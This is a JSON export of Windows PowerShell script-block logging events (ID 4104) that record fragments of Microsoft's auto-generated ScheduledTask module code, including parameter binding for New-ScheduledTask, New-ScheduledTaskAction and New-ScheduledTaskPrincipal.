$__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Settings')) {\r\n          [object]$__cmdletization_value = ${Settings}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Settings'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Settings'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskSettings'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Trigger')) {\r\n          [object]$__cmdletization_value = ${Trigger}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Trigger'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Trigger'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('New', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_ScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'New-ScheduledTask' -Alias '*'\r\n        \r\n\r\nfunction New-ScheduledTaskAction\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskAction')]\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Exec')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Id},\r\n\r\n    [Parameter(ParameterSetName='Exec', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Execute},\r\n\r\n    [Parameter(ParameterSetName='Exec', Position=1)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Argument},\r\n\r\n    [Parameter(ParameterSetName='Exec', Position=2)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${WorkingDirectory},\r\n\r\n    [Parameter(ParameterSetName='Exec')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Exec')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Exec')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Id')) {\r\n          [object]$__cmdletization_value = ${Id}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Id'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Id'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Execute')) {\r\n          [object]$__cmdletization_value = ${Execute}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Execute'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Execute'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Argument')) {\r\n          [object]$__cmdletization_value = ${Argument}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Argument'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Argument'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('WorkingDirectory')) {\r\n          [object]$__cmdletization_value = ${WorkingDirectory}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'WorkingDirectory'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'WorkingDirectory'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskAction'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('NewActionByExec', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_ScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'New-ScheduledTaskAction' -Alias '*'\r\n        \r\n\r\nfunction New-ScheduledTaskPrincipal\r\n{\r\n    [CmdletBinding(DefaultParameterSetName='User', PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskPrincipal')][OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskPrincipal')]\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Group', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${GroupId},\r\n\r\n    [Parameter(ParameterSetName='Group', Position=4)]\r\n    [Parameter(ParameterSetName='User', Position=5)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Id},\r\n\r\n    [Parameter(ParameterSetName='Group', Position=1)]\r\n    [Parameter(ParameterSetName='User', Position=2)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.RunLevelEnum]\r\n    ${RunLevel},\r\n\r\n    [Parameter(ParameterSetName='Group', Position=2)]\r\n    [Parameter(ParameterSetName='User', Position=3)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.ProcessTokenSidTypeEnum]\r\n    ${ProcessTokenSidType},\r\n\r\n    [Parameter(ParameterSetName='Group', Position=3)]\r\n    [Parameter(ParameterSetName='User', Position=4)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${RequiredPrivilege},\r\n\r\n    [Parameter(ParameterSetName='User', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${UserId},\r\n\r\n    [Parameter(ParameterSetName='User', Position=1)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.LogonTypeEnum]\r\n    ${LogonType},\r\n\r\n    [Parameter(ParameterSetName='Group')]\r\n    [Parameter(ParameterSetName='User')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Group')]\r\n    [Parameter(ParameterSetName='User')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Group')]\r\n    [Parameter(ParameterSetName='User')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThr",
    "ScriptBlockId": "57f72093-4163-4974-89ca-f2b6f8e7f653",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:23.412967Z"
    },
    "EventRecordID": 80,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0001-4D9F-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5908,
      "ThreadID": 2524
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 4,
    "MessageTotal": 12,
    "ScriptBlockText": "own = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n      switch -exact ($PSCmdlet.ParameterSetName) { \r\n        { @('Group') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('GroupId')) {\r\n          [object]$__cmdletization_value = ${GroupId}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'GroupId'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'GroupId'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Id')) {\r\n          [object]$__cmdletization_value = ${Id}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Id'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Id'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RunLevel')) {\r\n          [object]$__cmdletization_value = ${RunLevel}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RunLevel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.RunLevelEnum'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RunLevel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.RunLevelEnum'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ProcessTokenSidType')) {\r\n          [object]$__cmdletization_value = ${ProcessTokenSidType}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProcessTokenSidType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.ProcessTokenSidTypeEnum'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProcessTokenSidType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.ProcessTokenSidTypeEnum'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RequiredPrivilege')) {\r\n          [object]$__cmdletization_value = ${RequiredPrivilege}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RequiredPrivilege'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RequiredPrivilege'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskPrincipal'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('NewPrincipalByGroup', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('User') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('UserId')) {\r\n          [object]$__cmdletization_value = ${UserId}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UserId'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UserId'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('LogonType')) {\r\n          [object]$__cmdletization_value = ${LogonType}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LogonType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.LogonTypeEnum'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LogonType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.LogonTypeEnum'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Id')) {\r\n          [object]$__cmdletization_value = ${Id}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Id'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Id'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ProcessTokenSidType')) {\r\n          [object]$__cmdletization_value = ${ProcessTokenSidType}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProcessTokenSidType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.ProcessTokenSidTypeEnum'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProcessTokenSidType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.ProcessTokenSidTypeEnum'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RequiredPrivilege')) {\r\n          [object]$__cmdletization_value = ${RequiredPrivilege}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RequiredPrivilege'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RequiredPrivilege'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RunLevel')) {\r\n          [object]$__cmdletization_value = ${RunLevel}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RunLevel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.RunLevelEnum'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RunLevel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.RunLevelEnum'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskPrincipal'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('NewPrincipalByUser', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n    }\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_ScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'New-ScheduledTaskPrincipal' -Alias '*'\r\n        \r\n\r\nfunction New-ScheduledTaskSettingsSet\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskSettings')]\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisallowDemandStart},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    